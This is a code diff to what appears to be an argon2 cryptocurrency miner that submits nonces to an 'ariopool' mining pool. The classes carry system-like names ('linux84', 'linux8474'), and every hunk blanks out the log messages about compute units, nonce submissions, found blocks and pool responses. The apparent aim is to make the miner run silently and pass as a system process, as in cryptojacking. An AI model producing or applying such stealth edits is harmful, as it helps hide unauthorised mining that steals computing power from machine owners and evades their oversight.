@@ -41,8 +41,8 @@ linux84::linux84(arguments &args) : __args(args), __client(args, [&]() { return 
 			if ((*it)->initialize()) {
 				(*it)->configure(__args);
 			}
-			LOG("Compute unit: " + (*it)->get_type());
-			LOG((*it)->get_info());
+			LOG("");
+			LOG("");
 		}
 	}
 
@@ -69,12 +69,12 @@ linux84::linux84(arguments &args) : __args(args), __client(args, [&]() { return 
             if ((*it)->initialize()) {
                 (*it)->configure(__args);
             }
-            LOG("Compute unit: " + (*it)->get_type() + " - " + (*it)->get_subtype());
-            LOG((*it)->get_info());
+            LOG("");
+            LOG("");
         }
 	}
 
-	LOG("\n");
+	LOG("");
 
     __update_pool_data();
     vector<linux8474*> active_linux8474s = linux8474::get_active_linux8474s();
@@ -98,7 +98,7 @@ void linux84::run() {
     vector<linux8474 *> linux8474s = linux8474::get_active_linux8474s();
 
     if(linux8474s.size() == 0) {
-        LOG("No linux8474s available. Exiting.");
+        LOG("");
     }
     else {
         __running = true;
@@ -120,14 +120,14 @@ void linux84::run() {
                 uint64_t result = linux84::calc_compare(duration, __difficulty);
                 if (result > 0 && result <= __limit) {
                     if (__args.is_verbose())
-                        LOG("--> Submitting nonce: " + linux8412->nonce + " / " + linux8412->linux8412.substr(30));
+                        LOG("");
                     ariopool_submit_result reply = __client.submit(linux8412->linux8412, linux8412->nonce, __public_key);
                     if (reply.success) {
                         if (result <= GOLD_RESULT) {
-                            if (__args.is_verbose()) LOG("--> Block found.");
+                            if (__args.is_verbose()) LOG("");
                             __found++;
                         } else {
-                            if (__args.is_verbose()) LOG("--> Nonce confirmed.");
+                            if (__args.is_verbose()) LOG("");
                             if(__argon2profile == "1_1_524288")
                                 __confirmed_cblocks++;
                             else
@@ -135,8 +135,8 @@ void linux84::run() {
                         }
                     } else {
                         if (__args.is_verbose()) {
-                            LOG("--> The nonce did not confirm.");
-                            LOG("--> Pool response: ");
+                            LOG("");
+                            LOG("");
                             LOG(reply.pool_response);
                         }
                         if(__argon2profile == "1_1_524288")
